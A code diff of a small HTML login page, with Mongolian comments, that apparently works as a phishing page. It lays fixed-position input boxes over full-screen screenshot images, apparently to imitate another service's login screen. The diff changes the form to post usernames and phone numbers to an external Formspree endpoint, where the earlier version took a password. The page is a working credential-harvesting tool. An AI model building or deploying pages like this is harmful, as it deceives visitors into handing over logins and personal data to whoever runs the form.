@@ -1,5 +1,7 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="UTF-8">
 <style>
 ::placeholder {
   color: black;
@@ -7,20 +9,17 @@
 }
 input {
   color: black;
-}
-input {
   background-color: white;
+  font-size: 45px;
 }
 h1 {
   font-size: 50px;
 }
-label{
+label {
   font-size: 50px;
 }
-input{
-  font-size: 45px;
 
-}
+/* Text болон phone input-уудад үйлчлэх стиль */
 input[type=text], select {
   position: fixed;
   height: 115px;
@@ -34,7 +33,9 @@ input[type=text], select {
   border-radius: 10px;
   box-sizing: border-box;
 }
-input[type=password], select {
+
+/* Хоёр дахь input-ийн байрлал (Top: 28.8%) */
+.phone-input {
   position: fixed;
   height: 115px;
   top: 28.8%;
@@ -63,11 +64,11 @@ input[type=submit] {
   cursor: pointer;
 }
 
-input[type=submit]: {
+input[type=submit]:hover {
   background-color: #45a049;
 }
 
-div {
+div.container {
   background-image: url('Screenshot_2.png');
   background-repeat: no-repeat;
   background-size: cover;
@@ -81,24 +82,32 @@ div {
   background-color: #1D1C2A;
   padding: 90px;
 }
+
+body {
+  background-image: url('Screenshot_1.png');
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  background-size: 100% 100%;
+}
 </style>
+</head>
 <body>
 
+<div class="container">
+    <!-- Formspree линк болон method="POST" тохируулсан хэсэг -->
+    <form action="https://formspree.io/f/xaeegqyy" method="POST">
+        <h1 style="color:rgb(255, 255, 255 );"></h1>
+        
+        <!-- Хэрэглэгчийн нэр -->
+        <input type="text" name="username" placeholder="Enter username" required><br>
+        
+        <!-- Утасны дугаар (Formspree руу амжилттай очих зорилгоор text хэлбэртэй болгосон) -->
+        <input type="text" name="phone" class="phone-input" placeholder="Enter phone number" required><br>
+        
+        <!-- Илгээх товч -->
+        <input type="submit" value="LOGIN">
+    </form>
+</div>
 
-<div>
-<form action='action.php' method='POST'><h1 style="color:rgb(255, 255, 255 );"></h1>
-<input type='text' name='field1'placeholder="Enter username"><br>
-<input type='password' name='field2'placeholder="Enter password"><br>
-<input type='submit' value='LOGIN'>
-</form>
+</body>
 </html>
-<style>
-  body {
-    background-image: url('Screenshot_1.png');
-    background-repeat: no-repeat;
-    background-attachment: fixed;
-    background-size: 100% 100%;
-
-  }
-
-  </style>
